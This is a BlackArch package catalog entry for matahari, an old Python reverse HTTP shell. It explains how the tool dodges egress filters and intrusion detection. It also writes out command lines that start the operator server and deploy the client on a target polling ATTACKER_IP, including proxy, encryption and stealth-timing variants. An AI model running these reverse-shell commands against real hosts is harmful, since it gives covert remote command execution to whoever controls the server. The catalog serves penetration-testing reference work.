---
name: "matahari"
categories:
  - blackarch-tunnel
version: "0.1.30"
homepage: "http://matahari.sourceforge.net/"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: GPL
meta-checked: "2026-11-09"
github-repo: "olemoudi/matahari"
github-stars: 12
github-pushed: "2015-12-28"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-09"
worth: 1.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# matahari

> Reverse HTTP shell (2007): a small Python client that periodically polls an operator web server for commands and posts base64-encoded output back — shell traffic that egress firewalls read as ordinary web browsing.

## What it's for

Executing commands on unix hosts whose only way out is HTTP. The same script plays both roles: `-s` runs the operator-side server (takes the expected client's address), `-c` runs the target-side client polling the operator. All traffic is plain HTTP GET/POST carrying base64 payloads, so it passes egress filters and works through an outbound proxy (`-P`); optional ARC4 payload encryption uses a shared password plus a per-request salt to defeat replay. The polling interval is the stealth knob — from 10 seconds (`insane`) to 60 minutes (`stealth`) with an `adaptative` default, randomized further by `-i` (IDS evasion), and changeable at runtime from the server console with commands like `%polite`. Written by Martin Obiols Herrera (OleMoudi), SourceForge, Python 2. Interactive commands are unsupported, and there is no TLS — reach for it when HTTP is the only channel, not when content inspection matters. (The same-named jhudsl/matahari R package on GitHub is an unrelated project; this tool's own GitHub home is the author's olemoudi/matahari repo, a few commits past 0.1.30.)

## Typical use cases

### Start the operator-side server

```
sudo matahari -s 198.51.100.20 -p 8080
```

Outcome: binds 0.0.0.0:8080 (default port 80, chosen to look like standard web traffic) and opens the server console: commands typed here are handed to the client on its next poll, `&&`/`;` chain them, `%polite`-style commands retime polling, and Ctrl+C exits without harming the client.

### Deploy the client on the target

```
matahari -c ATTACKER_IP -p 8080 -e
```

Outcome: prompts once for the encryption password (must match the server's), then polls ATTACKER_IP:8080, executes each fetched command and POSTs the base64-encoded — with `-e`, ARC4-encrypted — output back. Non-interactive commands only; redirection and `sed`/`nc` are the documented workarounds.

### Reach the operator through an outbound proxy

```
matahari -c ATTACKER_IP -p 8080 -P proxy.example.com:3128
```

Outcome: the client sends absolute-URI requests via proxy.example.com:3128 instead of connecting directly — the shell keeps working from networks where only proxied web traffic is allowed out.

### Pick a stealthy polling profile

```
matahari -c ATTACKER_IP -p 8080 -T stealth -i
```

Outcome: the client checks in once an hour rather than adapting (types: insane 10s, agressive 25s, normal 60s, polite 5m, paranoid 30m, stealth 60m, adaptative), and `-i` randomizes each interval up to 2x so the check-in cadence resists statistical detection. Polling can still be retuned on the fly from the server with `%paranoid` and friends.

*No corpus evidence — derived from upstream documentation.*
